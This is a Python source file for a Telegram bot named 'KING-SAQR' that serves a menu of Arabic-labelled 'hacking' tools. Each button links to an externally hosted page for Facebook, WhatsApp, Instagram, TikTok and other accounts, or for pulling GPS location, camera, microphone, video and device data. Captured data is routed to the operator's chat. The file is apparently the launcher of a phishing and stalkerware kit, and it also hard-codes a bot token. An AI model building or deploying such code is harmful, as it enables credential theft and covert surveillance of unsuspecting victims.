import os
from flask import Flask, request
from telebot import TeleBot, types

TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
BASE_URL = "https://fgnral-html.onrender.com"

bot = TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

TOOLS_PAIRS = [
    ("📘 اختراق فيسبوك", "facebook.html",          "🎵 اختراق تيك توك", "tiktok.html"),
    ("👻 اختراق سناب شات", "snapchat.html",         "📷 اختراق انستقرام", "instagram.html"),
    ("💬 اختراق واتساب", "whatsapp.html",           "✈️ اختراق تيليجرام", "telegram.html"),
    ("🐦 اختراق تويتر", "twitter.html",             "▶️ اختراق يوتيوب", "youtube.html"),
    ("🎮 اختراق ديسكورد", "discord.html",           "🤖 اختراق ريدت", "reddit.html"),
    ("📍 سحب الموقع", "gps.html",                   "📸 اختراق الكاميرا", "camera.html"),
    ("🎙️ تسجيل الصوت", "mic.html",                  "🎥 تصوير فيديو", "video.html"),
]
FINAL_TOOL = ("📱 فحص مواصفات الجهاز", "device.html")

@app.route(f"/{TOKEN}", methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    return '!', 403

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    chat_id = message.chat.id
    for left_name, left_file, right_name, right_file in TOOLS_PAIRS:
        left_url = f"{BASE_URL}{left_file}?chat={chat_id}"
        right_url = f"{BASE_URL}{right_file}?chat={chat_id}"
        markup.row(
            types.InlineKeyboardButton(text=left_name, url=left_url),
            types.InlineKeyboardButton(text=right_name, url=right_url)
        )
    final_name, final_file = FINAL_TOOL
    final_url = f"{BASE_URL}{final_file}?chat={chat_id}"
    markup.row(types.InlineKeyboardButton(text=final_name, url=final_url))
    bot.send_message(message.chat.id,
        "🔱 <b>KING-SAQR – لوحة الأدوات</b>\n\nاختر الأداة وستفتح مباشرة. البيانات تصل إلى محادثتك هنا فقط.",
        reply_markup=markup, parse_mode="HTML")

if __name__ == '__main__':
    bot.remove_webhook()
    bot.set_webhook(url="https://your-bot.onrender.com/" + TOKEN)
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))